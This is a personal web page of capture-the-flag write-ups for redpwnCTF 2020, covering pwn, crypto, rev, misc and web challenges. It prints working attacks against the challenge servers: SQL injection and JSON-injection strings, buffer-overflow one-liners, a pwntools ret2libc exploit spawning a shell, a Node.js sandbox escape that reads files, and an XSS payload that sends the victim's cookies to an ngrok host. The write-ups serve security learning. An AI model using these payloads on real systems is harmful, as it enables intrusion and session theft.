<!--
Did you know? When a Venus' flytrap captures prey, it
secretes digestive juices in a way similar to how a stomach
functions. This allows the plant to breakdown its prey,
although it cannot envelop the tough exoskeletons of insects.
Instead, it reopens and allows the debris to fall away. 
-->
<!DOCTYPE html>
<html>
	<head>
		<title>red cone 2020</title>
		<meta charset="utf-8" />
		<link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
		<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
		<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
		<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
		<script>hljs.initHighlightingOnLoad();</script>
	</head>
	<body>
		<div class="box">
			<h1 class="header-red">nesrak1</h1>
			<h3>professional human</h3>
			<div>
				<a href="/">home</a>
				<a href="/ctf.html">ctf</a>
				<a href="https://github.com/nesrak1/">github</a>
				<a href="https://www.youtube.com/channel/UClV2i0LTChvvmMxYUlTa52Q/videos">youtube</a>
			</div>
			<hr/>
			<h2 class="header-red">&gt; redpwn 2020 writeups</h2>
			<p>I'm slow so I haven't done all the write ups yet</p>
			<ul>
				<li>pwn<ul>
					<li><a href="#coffer-overflow-0">coffer-overflow-0</a></li>
					<li><a href="#coffer-overflow-1">coffer-overflow-1</a></li>
					<li><a href="#coffer-overflow-2">coffer-overflow-2</a></li>
					<li><a href="#secret-flag">secret-flag</a></li>
					<li><a href="#the-library">the-library</a></li>
				</ul></li>
				<li>crypto<ul>
					<li><a href="#base646464">base646464</a></li>
					<li><a href="#pseudo-key">pseudo-key</a></li>
					<li><a href="#4k-rsa">4k-rsa</a></li>
					<li><a href="#12-shades-of-redpwn">12-shades-of-redpwn</a></li>
					<li><a href="#itsy-bitsy">itsy-bitsy</a></li>
				</ul></li>
				<li>misc<ul>
					<li><a href="#uglybash">uglybash</a></li>
					<li><a href="#CaaSiNO">CaaSiNO</a></li>
				</ul></li>
				<li>rev<ul>
					<li><a href="#ropes">ropes</a></li>
					<li><a href="#bubbly">bubbly</a></li>
					<li><a href="#SMarT-solver">SMarT-solver</a></li>
					<li><a href="#chezzzboard">chezzzboard</a></li>
					<li><a href="#wintendo-nii">wintendo-nii</a></li>
					<li><a href="#i-wanna-find-the-flag">i-wanna-find-the-flag</a></li>
					<li><a href="#fetusmaze">fetusmaze</a></li>
					<li><a href="#a-round-mechanism">a-round-mechanism</a></li>
				</ul></li>
				<li>web<ul>
					<li><a href="#inspector-general">inspector-general</a></li>
					<li><a href="#login">login</a></li>
					<li><a href="#static-pastebin">static-pastebin</a></li>
					<li><a href="#panda-facts">panda-facts</a></li>
					<li><a href="#static-static-hosting">static-static-hosting</a></li>
					<li><a href="#tux-fanpage">tux-fanpage</a></li>
				</ul></li>
			</ul>
			
			<div>
			  <hr />
 			  <h3 id="inspector-general">web/inspector-general</h3>
			  <h5>NotDeGhost</h5>
			  <blockquote>
			    <p>My friend made a new webpage, can you <a href="https://redpwn.net/">find a flag?</a></p>
			  </blockquote>
			  <p>No skill needed, just check page source</p>
			  <hr />
 			  <h3 id="ropes">rev/ropes</h3>
			  <h5>NotDeGhost</h5>
			  <blockquote>
			    <p>It's not just a string, it's a rope!</p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/rev/ropes/bin/ropes">ropes</a></p>
			  </blockquote>
			  <p>Run strings command on the file.</p>
			  <hr />
 			  <h3 id="base646464">crypto/base646464</h3>
			  <h5>NotDeGhost</h5>
			  <blockquote>
			    <p>Encoding something multiple times makes it exponentially more secure!</p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/crypto/base646464/bin/cipher.txt">cipher.txt</a>
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/crypto/base646464/bin/generate.js">generate.js</a></p>
			  </blockquote>
			  <p>Recursive base64</p>
			  <pre><code class="python language-python">import base64
with open("cipher.txt") as file:
    text = file.read()
    for i in range(25):
        text = base64.b64decode(text)
    print(text.decode('utf-8'))</code></pre>
			  <hr />
 			  <h3 id="login">web/login</h3>
			  <h5>BrownieInMotion</h5>
			  <blockquote>
			    <p>I made a cool login page. I bet you can't get in!</p>
			    <p>Site: <a href="login.2020.redpwnc.tf">login.2020.redpwnc.tf</a> or <a href="https://github.com/redpwn/redpwnctf-2020-challenges/tree/master/web/login">mirror</a></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/web/login/index.js">index.js</a></p>
			  </blockquote>
			  <p>Sql injection</p>
			  <p>Username: blank</p>
			  <p>Password: <code>' or 1=1 --</code></p>
			  <p>TODO info</p>
			  <hr />
 			  <h3 id="coffer-overflow-0">pwn/coffer-overflow-0</h3>
			  <h5>NotDeGhost</h5>
			  <blockquote>
			    <p>Can you fill up the coffers? We even managed to find the source for you.</p>
			    <p><code>nc 2020.redpwnc.tf 31199</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/pwn/coffer-overflow-0/bin/coffer-overflow-0">coffer-overflow-0</a>
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/pwn/coffer-overflow-0/bin/coffer-overflow-0.c">coffer-overflow-0.c</a></p>
			  </blockquote>
			  <p>Let's look at the code we get. (see downloads)</p>
			  <p>It looks like the code prints the flag if code is 0. So we just have to type more than 16 characters. Then we have shell, which means we have access to the server that program runs on. So we can just run <code>ls</code> where we can see a file called flag.txt. Then we can print it out by running <code>cat flag.txt</code>.</p>
			  <hr />
 			  <h3 id="coffer-overflow-1">pwn/coffer-overflow-1</h3>
			  <h5>NotDeGhost</h5>
			  <blockquote>
			    <p>The coffers keep getting stronger! You'll need to use the source, Luke.</p>
			    <p><code>nc 2020.redpwnc.tf 31255</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/pwn/coffer-overflow-1/bin/coffer-overflow-1">coffer-overflow-1</a>
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/pwn/coffer-overflow-1/bin/coffer-overflow-1.c">coffer-overflow-1.c</a></p>
			  </blockquote>
			  <p>This time, we need the value to equal 0xcafebabe. But how do we do that? You could type that, but that would be ascii representation, not hex notation. Those aren't normally typable in the console. There are two solutions, and we'll take the easier one since we only have one input. You can feed in input into netcat like so:</p>
			  <pre><code class="bash language-bash">python -c "print('text and \x15')" | nc 2020.redpwnc.tf 31255</code></pre>
			  <p>So we can write characters using hex notation with <code>\x..</code>. But you can't do this:</p>
			  <pre><code class="bash language-bash">python -c "print('AAAAAAAAAAAAAAAA\xca\xfe\xba\xbe')" | nc 2020.redpwnc.tf 31255</code></pre>
			  <p>Because of little endian, which means the bytes are in reverse order. So you'd have to do this:</p>
			  <pre><code class="bash language-bash">python -c "print('A'*16 + '\xbe\xba\xfe\xca')" | nc 2020.redpwnc.tf 31255</code></pre>
			  <p>(Note, the value is a long which is 8 bytes. The number usually looks like this: <code>[0000000000000000]</code> and when we change it it looks like this <code>[BEBAFECA00000000]</code>. Because the values are already 0, we don't have to worry about overwriting those.)</p>
			  <p>But remember we have to worry about the cat flag.txt so…</p>
			  <pre><code class="bash language-bash">python -c "print('A'*16 + '\xbe\xba\xfe\xca');print('cat flag.txt')" | nc 2020.redpwnc.tf 31255</code></pre>
			  <p>(Note, this won't work on windows because piping a newline actually sends a carriage return and a newline, breaking the cat command. (<code>cat: 'flag.txt'$'\r': No such file or directory</code>) Just use linux. If you really want to run on windows, use this:</p>
			  <pre><code class="bash language-bash">python -c "print('A'*16 + '\xbe\xba\xfe\xca\x00\x00\x00\x00');print('cat flag.txt;echo e')" | nc 2020.redpwnc.tf 31255</code></pre>
			  <p>This works because it passes the carriage return problem to the echo command instead of the cat command.</p>
			  <hr />
 			  <h3 id="coffer-overflow-2">pwn/coffer-overflow-2</h3>
			  <h5>NotDeGhost</h5>
			  <blockquote>
			    <p>You'll have to jump to a function now!?</p>
			    <p><code>nc 2020.redpwnc.tf 31908</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/pwn/coffer-overflow-2/bin/coffer-overflow-2">coffer-overflow-2</a>
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/pwn/coffer-overflow-2/bin/coffer-overflow-2.c">coffer-overflow-2.c</a></p>
			  </blockquote>
			  <p>All we have to do is overwrite the return address for when the main function exits to go to the function binFunction. I personally use a mixture of Ghidra, and IDA free.</p>
			  <pre><code class="bash language-bash">python -c "print('A'*24 + '\xe6\x06\x40\x00\x00\x00\x00\x00');print('cat flag.txt');echo e" | nc 2020.redpwnc.tf 31908</code></pre>
			  <p>For later problems I'll be using pwntools which is not supported on windows but much easier to use.</p>
			  <hr />
 			  <h3 id="pseudo-key">crypto/pseudo-key</h3>
			  <h5>Boolean</h5>
			  <blockquote>
			    <p>Keys are not always as they seem…</p>
			    <p><strong>Note:</strong> Make sure to wrap the plaintext with flag{} before you submit!</p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/crypto/pseudo-key/pseudo-key-output.txt">pseudo-key-output.txt</a>
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/crypto/pseudo-key/pseudo-key.py">pseudo-key.py</a></p>
			  </blockquote>
			  <p>A message is encrypted with a key by adding the values of the message and key together and modding by 26. However, the key is encrypted with itself. Since the encryption method is on a per character basis, it doesn't matter what we don't have to do anything weird with the overall message.</p>
			  <pre><code class="js language-js">var alp = "abcdefghijklmnopqrstuvwxyz";

function sukeydec(key) {
    var t = "";
    for (var i = 0; i &lt; key.length; i++) {
        var chr = key[i];
        for (var j = 0; j &lt; alp.length; j++) {
            if (alp[(j * 2)%26] == chr) {
                t += alp[j] + " ";
            }
        }
        t += "\n";
    }
    return t;
}</code></pre>
			  <pre><code>e r 
e r 
d q 
c p 
j w 
j w 
j w 
a n 
c p 
g t 
f s </code></pre>
			  <p>There are two possibilities for each letter, but it's not hard to see: <code>redpwwwnctf</code>.</p>
			  <p>So now we know our key, let's decode it:</p>
			  <pre><code class="js language-js">function sudec(text, key) {
    var t = "";

    //cheap but works
    var origKey = key;
    while (key.length &lt; text.length) {
        key += origKey;
    }

    for (var i = 0; i &lt; text.length; i++) {
        var chr = text[i];
        if (chr == "_") {
            t += "_";
        } else {
            for (var j = 0; j &lt; alp.length; j++) {
                if (alp[(j + alp.indexOf(key[i]))%26] == chr) {
                    t += alp[j];
                }
            }
        }
    }
    return t;
}</code></pre>
			  <hr />
 			  <h3 id="secret-flag">pwn/secret-flag</h3>
			  <h5>NotDeGhost</h5>
			  <blockquote>
			    <p>There's a super secret flag in printf that allows you to LEAK the data at an address??</p>
			    <p><code>nc 2020.redpwnc.tf 31826</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/pwn/secret-flag/bin/secret-flag">secret-flag</a></p>
			  </blockquote>
			  <hr />
 			  <h3 id="uglybash">misc/uglybash</h3>
			  <h5>arinerron</h5>
			  <blockquote>
			    <p>This bash script evaluates to echo dont just run it, dummy # flag{…} where the flag is in the comments.</p>
			    <p>The comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes?</p>
			    <p>Enjoy the intro misc chal.</p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/misc/uglybash/cmd.sh">cmd.sh</a></p>
			  </blockquote>
			  <p>Run in debugging mode</p>
			  <pre><code class="bash language-bash">bash -x cmd.sh</code></pre>
			  <p>Obviously that prints a lot of junk so you can do</p>
			  <pre><code class="bash language-bash">bash -x cmd.sh 2&gt;&amp;1 | grep '+++ printf %s'</code></pre>
			  <p>Note that version <code>4.4.23(1)-release</code> of bash didn't seem to work for me but <code>4.4.23(2)-release</code> did. ???</p>
			  <hr />
 			  <h3 id="static-pastebin">web/static-pastebin</h3>
			  <h5>BrownieInMotion</h5>
			  <blockquote>
			    <p>I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it <a href="https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin">here</a></p>
			    <p>Site: static-pastebin.2020.redpwnc.tf</p>
			    <p>Note: The site is entirely static. Dirbuster will not be useful in solving it.</p>
			  </blockquote>
			  <p>The page has a textbox and anything you type will be turned into base64 and put in the url. However, the js on the page removes anything in &lt;&gt;s. The code works by adding one to a variable for &lt; and subtracting one with a &gt;. So you can start with &gt;&lt; which makes the value equal to one, and you can type stuff into html tags. I used the following:</p>
			  <pre><code class="html language-html">&gt;&lt;img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" onload="alert('hi');"/&gt;</code></pre>
			  <p>The whole point of this challenge is to find the flag and we have a bot that let's us go to the page. So we need to execute some js on the bot's computer to gain a flag. There's only a few places that stuff like that can be stored such as local storage or cookies. In this case it ended up being cookies.</p>
			  <pre><code class="html language-html">&gt;&lt;img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" onload="alert(document.cookie);"/&gt;</code></pre>
			  <p>But we need a way to send it to ourselves. I've heard of postbin, which is probably easier, however personally I used ngrok. You can start ngrok with <code>ngrok http 8080</code> and a python server <code>python -m http.server 8080</code> and then write some code to go to a fake page with that url.</p>
			  <pre><code class="html language-html">&gt;&lt;img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" onload="window.location='https://xxxxxxxxxxxx.ngrok.io/nothing?flag=' + document.cookie;"/&gt;</code></pre>
			  <p>Of course if you try to visit it you'll find a 404 not found but that doesn't matter. The python server should say something like this:</p>
			  <pre><code>::1 - - [26/Jun/2020 14:09:55] "GET /nothing?flag= HTTP/1.1" 404 -</code></pre>
			  <p>So you know how the client visited your server. So just copy the base64 url and give it to the bot to do.</p>
			  <hr />
 			  <h3 id="4k-rsa">crypto/4k-rsa</h3>
			  <h5>Boolean</h5>
			  <p>Explained <a href="https://blog.hackeriet.no/solution-to-fireshell-biggar/">here</a>.</p>
			  <p>No sagemath needed</p>
			  <p><a href="http://factordb.com/index.php?query=5028492424316659784848610571868499830635784588253436599431884204425304126574506051458282629520844349077718907065343861952658055912723193332988900049704385076586516440137002407618568563003151764276775720948938528351773075093802636408325577864234115127871390168096496816499360494036227508350983216047669122408034583867561383118909895952974973292619495653073541886055538702432092425858482003930575665792421982301721054750712657799039327522613062264704797422340254020326514065801221180376851065029216809710795296030568379075073865984532498070572310229403940699763425130520414160563102491810814915288755251220179858773367510455580835421154668619370583787024315600566549750956030977653030065606416521363336014610142446739352985652335981500656145027999377047563266566792989553932335258615049158885853966867137798471757467768769820421797075336546511982769835420524203920252434351263053140580327108189404503020910499228438500946012560331269890809392427093030932508389051070445428793625564099729529982492671019322403728879286539821165627370580739998221464217677185178817064155665872550466352067822943073454133105879256544996546945106521271564937390984619840428052621074566596529317714264401833493628083147272364024196348602285804117877">factordb</a></p>
			  <pre><code class="py language-py">from Crypto.Util.number import long_to_bytes
              
def euler_phi():
return (1 - 9353689450544968301) * (1 - 9431486459129385713) * (1 - 9563871376496945939) * (1 - 9734621099746950389) * (1 - 9736426554597289187) * (1 - 10035211751896066517) * (1 - 10040518276351167659) * (1 - 10181432127731860643) * (1 - 10207091564737615283) * (1 - 10435329529687076341) * (1 - 10498390163702844413) * (1 - 10795203922067072869) * (1 - 11172074163972443279) * (1 - 11177660664692929397) * (1 - 11485099149552071347) * (1 - 11616532426455948319) * (1 - 11964233629849590781) * (1 - 11992188644420662609) * (1 - 12084363952563914161) * (1 - 12264277362666379411) * (1 - 12284357139600907033) * (1 - 12726850839407946047) * (1 - 13115347801685269351) * (1 - 13330028326583914849) * (1 - 13447718068162387333) * (1 - 13554661643603143669) * (1 - 13558122110214876367) * (1 - 13579057804448354623) * (1 - 13716062103239551021) * (1 - 13789440402687036193) * (1 - 13856162412093479449) * (1 - 13857614679626144761) * (1 - 14296909550165083981) * (1 - 14302754311314161101) * (1 - 14636284106789671351) * (1 - 14764546515788021591) * (1 - 14893589315557698913) * (1 - 15067220807972526163) * (1 - 15241351646164982941) * (1 - 15407706505172751449) * (1 - 15524931816063806341) * (1 - 15525253577632484267) * (1 - 15549005882626828981) * (1 - 15687871802768704433) * (1 - 15720375559558820789) * (1 - 15734713257994215871) * (1 - 15742065469952258753) * (1 - 15861836139507191959) * (1 - 16136191597900016651) * (1 - 16154675571631982029) * (1 - 16175693991682950929) * (1 - 16418126406213832189) * (1 - 16568399117655835211) * (1 - 16618761350345493811) * (1 - 16663643217910267123) * (1 - 16750888032920189263) * (1 - 16796967566363355967) * (1 - 16842398522466619901) * (1 - 17472599467110501143) * (1 - 17616950931512191043) * (1 - 17825248785173311981) * (1 - 18268960885156297373) * (1 - 18311624754015021467) * (1 - 18415126952549973977)

def egcd(a, b):
if a == 0:
    return (b, 0, 1)
else:
    g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)

def modinv(a, m):
g, x, y = egcd(a, m)
if g != 1:
    raise Exception('modular inverse does not exist')
else:
    return x % m

e = 65537
N = 5028492424316659784848610571868499830635784588253436599431884204425304126574506051458282629520844349077718907065343861952658055912723193332988900049704385076586516440137002407618568563003151764276775720948938528351773075093802636408325577864234115127871390168096496816499360494036227508350983216047669122408034583867561383118909895952974973292619495653073541886055538702432092425858482003930575665792421982301721054750712657799039327522613062264704797422340254020326514065801221180376851065029216809710795296030568379075073865984532498070572310229403940699763425130520414160563102491810814915288755251220179858773367510455580835421154668619370583787024315600566549750956030977653030065606416521363336014610142446739352985652335981500656145027999377047563266566792989553932335258615049158885853966867137798471757467768769820421797075336546511982769835420524203920252434351263053140580327108189404503020910499228438500946012560331269890809392427093030932508389051070445428793625564099729529982492671019322403728879286539821165627370580739998221464217677185178817064155665872550466352067822943073454133105879256544996546945106521271564937390984619840428052621074566596529317714264401833493628083147272364024196348602285804117877
C = 3832859959626457027225709485375429656323178255126603075378663780948519393653566439532625900633433079271626752658882846798954519528892785678004898021308530304423348642816494504358742617536632005629162742485616912893249757928177819654147103963601401967984760746606313579479677305115496544265504651189209247851288266375913337224758155404252271964193376588771249685826128994580590505359435624950249807274946356672459398383788496965366601700031989073183091240557732312196619073008044278694422846488276936308964833729880247375177623028647353720525241938501891398515151145843765402243620785039625653437188509517271172952425644502621053148500664229099057389473617140142440892790010206026311228529465208203622927292280981837484316872937109663262395217006401614037278579063175500228717845448302693565927904414274956989419660185597039288048513697701561336476305496225188756278588808894723873597304279725821713301598203214138796642705887647813388102769640891356064278925539661743499697835930523006188666242622981619269625586780392541257657243483709067962183896469871277059132186393541650668579736405549322908665664807483683884964791989381083279779609467287234180135259393984011170607244611693425554675508988981095977187966503676074747171

phi = euler_phi()
d = modinv(e, phi)
M = pow(C,d,N)

print(long_to_bytes(M))</code></pre>
			  <hr />
 			  <h3 id="bubbly">rev/bubbly</h3>
			  <h5>dns</h5>
			  <blockquote>
			    <p>It never ends</p>
			    <p><code>nc 2020.redpwnc.tf 31039</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/tree/master/rev/bubbly/bin">bubbly</a></p>
			  </blockquote>
			  <p>Ghidra cleaned:</p>
			  <pre><code class="c language-c">int nums[] = {1, 10, 3, 2, 5, 9, 8, 7, 4, 6};

bool check(void) {
    uint32_t i;
    bool pass;

    i = 0;
    while(true) {
        if (8 &lt; i)
            return true;
        if (nums[i + 1] &lt; nums[i])
            break;
        i = i + 1;
    }
    return false;
}

int main() {
    uint32_t i;
    int unused;
    bool pass;

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    puts("I hate my data structures class! Why can't I just sort by hand?");

    pass = false;

    while(true) {
        scanf("%d", &amp;i);
        if (8 &lt; i)
            break;
        nums[i] = nums[i] ^ nums[i + 1];
        nums[i + 1] = nums[i + 1] ^ nums[i];
        nums[i] = nums[i] ^ nums[i + 1];
        pass = check();
    }
    if (!pass) {
        puts("Try again!");
    } else {
        puts("Well done!");
        print_flag();
    }
    return 0;
}</code></pre>
			  <p>It's bubble sort so all you have to do is sort the array manually. The sort code (in the main's while loop) just swaps the index you select with the index you select+1. So just manually sort nums[] until it's in order.</p>
			  <hr />
 			  <h3 id="CaaSiNO">misc/CaaSiNO</h3>
			  <h5>asphyxia</h5>
			  <blockquote>
			    <p>Who needs regex for sanitization when we have VMs?!?!</p>
			    <p>The flag is at /ctf/flag.txt</p>
			    <p><code>nc 2020.redpwnc.tf 31273</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/misc/caasino/run/calculator.js">calculator.js</a></p>
			  </blockquote>
			  <p>Explained <a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html">here</a>.</p>
			  <p><code>this.constructor.constructor("return this.process")().mainModule.require("child_process").execSync("cat /ctf/flag.txt").toString()</code></p>
			  <hr />
 			  <h3 id="panda-facts">web/panda-facts</h3>
			  <h5>BrownieInMotion</h5>
			  <blockquote>
			    <p>I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down!</p>
			    <p>Site: <a href="panda-facts.2020.redpwnc.tf">panda-facts.2020.redpwnc.tf</a></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/web/panda-facts/index.js">index.js</a></p>
			  </blockquote>
			  <pre><code class="js language-js">const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`</code></pre>
			  <p>So we can just use the quotes to close out username, redefine member, and then the e field for a dummy value just so we can close the quotes.</p>
			  <p><code>no u","member":1,"e":"e</code></p>
			  <hr />
 			  <h3 id="the-library">pwn/the-library</h3>
			  <h5>NotDeGhost</h5>
			  <blockquote>
			    <p>There's not a lot of useful functions in the binary itself. I wonder where you can get some…</p>
			    <p><code>nc 2020.redpwnc.tf 31350</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/pwn/the-library/bin/the-library">the-library</a>
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/pwn/the-library/bin/the-library.c">the-library.c</a>
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/pwn/the-library/bin/libc.so.6">libc.so.6</a></p>
			  </blockquote>
			  <p>Explained <a href="https://tasteofsecurity.com/security/ret2libc-unknown-libc/">here</a>.</p>
			  <p>Note, this requires python2. You could probably fix it up with python3 but I was too lazy.</p>
			  <p>Note, requires linux for pwntools</p>
			  <pre><code class="py language-py">from pwn import * # Import pwntools

p = remote("2020.redpwnc.tf", 31350)#process("./the-library") # start the vuln binary
elf = ELF("./the-library") # Extract data from binary
libc = ELF("libc.so.6")
rop = ROP(elf) # Find ROP gadgets

PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))
log.info("ret gadget: " + hex(RET))

# Overflow buffer until return address
base = "A"*16 + "B"*8
# Create rop chain
rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) + p64(PUTS) + p64(MAIN)

t = raw_input("press enter")

# Send our rop-chain payload
p.sendlineafter("name?", rop)

# Parse leaked address
p.recvline()
p.recvline()
p.recvline()
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

BINSH = next(libc.search("/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = base + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

p.sendlineafter("name?", rop2)
p.read()

p.interactive()</code></pre>
			  <hr />
 			  <h3 id="12-shades-of-redpwn">crypto/12-shades-of-redpwn</h3>
			  <h5>Boolean</h5>
			  <blockquote>
			    <p>Everyone's favorite guess god Tux just sent me a flag that he somehow encrypted with a color wheel!</p>
			    <p>I don't even know where to start, the wheel looks more like a clock than a cipher… can you help me crack the code?</p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/crypto/12-shades-of-redpwn/ciphertext.jpg">ciphertext.jpg</a>
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/crypto/12-shades-of-redpwn/color-wheel.jpg">color-wheel.jpg</a></p>
			  </blockquote>
			  <p>Each square is base 12. Can't see the difference between the colors? Use a color picker in any image editor. I personally did the whole thing by hand.</p>
			  <p>Just use something to convert the base 12 to base 16 and then boom flag.</p>
			  <pre><code>b10 8/6 9/12 8/1 8/7 10/3 4/9 9/9 4/3 9/7 9/7 4/1 9/2 4/9 7/11 4/1 9/7 7/11 4/4 9/2 7/11 4/4 9/6 9/8 10/5
b12 86 90 81 87 A3 49 99 43 97 97 41 92 49 7B 41 97 7B 44 92 7B 44 96 98 A5
b16 66 6C 61 67 7B 39 75 33 73 73 31 6E 39 5F 31 73 5F 34 6E 5F 34 72 74 7D</code></pre>
			  <hr />
 			  <h3 id="static-static-hosting">web/static-static-hosting</h3>
			  <h5>BrownieInMotion</h5>
			  <blockquote>
			    <p>Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me <a href="https://admin-bot.redpwnc.tf/submit?challenge=static-static-hosting">here</a></p>
			    <p>Site: <a href="static-static-hosting.2020.redpwnc.tf">static-static-hosting.2020.redpwnc.tf</a></p>
			    <p>Note: The site is entirely static. Dirbuster will not be useful in solving it.</p>
			  </blockquote>
			  <p>Same thing but different exploit. We can use the fact that iframes have src and can run javascript to do this one.</p>
			  <pre><code class="js language-js">&lt;iframe src="javascript:alert('hi')"&gt;&lt;/iframe&gt;</code></pre>
			  <hr />
 			  <h3 id="crypto/itsy-bitsy">crypto/itsy-bitsy</h3>
			  <h5>Boolean</h5>
			  <blockquote>
			    <p>The itsy-bitsy spider climbed up the water spout…</p>
			    <p><code>nc 2020.redpwnc.tf 31284</code></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/crypto/itsy-bitsy/itsy-bitsy.py">itsy-bitsy</a></p>
			  </blockquote>
			  <p>You have two ranges you can select from. Numbers are randomly selected from that range and are converted into binary (no padding) and put into a string to be xor'd with the flag.</p>
			  <pre><code>left num (&lt;) values you can select:   2 4 8 16 ...
right num (&gt;) values you can select:    3 7 15 ...
0    0
1    1
2&lt;   10
3&gt;   11
4&lt;   100
5    101
6    110
7&gt;   111
8&lt;   1000
9    1001
10   1010
11   1011
12   1100
13   1101
14   1110
15&gt;  1111
16&lt;  10000
17   10001
18   10010</code></pre>
<p>If you did ranges like 2-3 or 4-7 or 8-15, you'd get an equal amount of 1s and 0s. But what if you did 2-7? Now the values are of different bit lengths. You can run some statistics on this to see how often 1 shows up over 0.</p>
<pre><code class="py language-py">from Crypto.Random.random import randint

arr = [0] * 301
def generate_random_bits(lower_bound, upper_bound, number_of_bits):
    bit_str = ''
    while len(bit_str) &lt; number_of_bits:
        r = randint(lower_bound, upper_bound)
        bit_str += bin(r)[2:]
    return bit_str[:number_of_bits]

for j in range(100):
    text = generate_random_bits(2**1, 2**3 - 1, 301)
    i = 0
    for d in text:
        if d == '0':
            arr[i] -= 1
        elif d == '1':
            arr[i] += 1
        i += 1

g = [0] * 301

i = 0
for a in arr:
    if a &lt; -16:
        g[i] = 0 # usually not xor'd
    elif a &gt; 16:
        g[i] = 1 # usually xor'd
    else:
        g[i] = 2 # unsure
    i += 1

print(g)</code></pre>
			  <p>And you'll find that 1 shows up more consistently than 0. Because of this, we can run the program multiple times over and over and the value that shows up more consistently should be flipped.</p>
			  <p>Note, requires linux for pwntools</p>
			  <pre><code class="py language-py">from pwn import *

arr = [0] * 301
for j in range(100):
    print('this is my ' + str(j) + ' time')
    sh = remote('2020.redpwnc.tf', 31284)
    sh.read()
    sh.send('1\n')
    sh.read()
    sh.send('3\n')
    text = sh.read()[12:]
    i = 0
    for c in text:
        d = chr(c)
        if d == '0':
            arr[i] -= 1
        elif d == '1':
            arr[i] += 1
        i += 1
    sh.close()

g = [0] * 301
i = 0
for a in arr:
    if a &lt; -8:
        g[i] = 1
    elif a &gt; 8:
        g[i] = 0
    else:
        g[i] = 2
    i += 1

print(g)</code></pre>
			  <p>Then you get an array with bits. You can turn that into a string, add a 0 to the beginning of every 7 characters (because it's ascii), and convert the binary to text and boom you got flag. Of course sometimes there are 2s so you can replace them with whatever but it should be easy to figure out what the flag says.</p>
			  <hr />
 			  <h3 id="tux-fanpage">web/tux-fanpage</h3>
			  <h5>BrownieInMotion</h5>
			  <blockquote>
			    <p>My friend made a fanpage for Tux; can you steal the source code for me?</p>
			    <p>Site: <a href="tux-fanpage.2020.redpwnc.tf">tux-fanpage.2020.redpwnc.tf</a></p>
			    <p>Downloads:
			    <a href="https://github.com/redpwn/redpwnctf-2020-challenges/blob/master/web/tux-fanpage/index.js">index.js</a></p>
			  </blockquote>
			  <p>Obviously we need to get to ../index.js somehow but obviously we can't do that by normal means. It turns out that if we have the same query multiple times, that value turns into an array.</p>
			  <p>When <code>/page?path=index.html&amp;path=notindex.html</code>, <code>path = ["index.html","notindex.html"]</code></p>
